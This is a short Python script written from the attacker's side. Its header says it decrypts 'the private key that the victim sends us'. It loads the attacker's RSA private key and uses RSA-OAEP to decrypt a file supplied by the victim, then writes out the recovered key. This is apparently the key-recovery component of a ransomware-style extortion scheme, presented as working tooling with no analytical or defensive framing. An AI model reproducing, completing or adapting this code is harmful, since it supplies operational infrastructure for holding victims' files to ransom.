### This code can be used to decrypt the private key that the victim sends us

import sys
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode

if len(sys.argv) == 1:
    print('No file inserted in args!')
    exit()

private_key_PEM = ''

try:
    f = open('myKey_private.pem', 'r')
    private_key_PEM = f.read()
    f.close()
except:
    print('No private key found!')
    exit()

encrypted_bytes = b''

try:
    f = open(sys.argv[1], 'rb')
    encrypted_bytes = f.read()
    f.close()
except:
    print('No such file, please make sure the file you want to decrypt is spelled like that!')
    exit()


private_key = RSA.importKey(private_key_PEM)
cipher = PKCS1_OAEP.new(private_key)
head, tail = os.path.split(sys.argv[1])
f = open('decryption_key.pem', 'wb')
original = b64encode(cipher.decrypt(encrypted_bytes))
f.write(original)
f.close()
print(original)



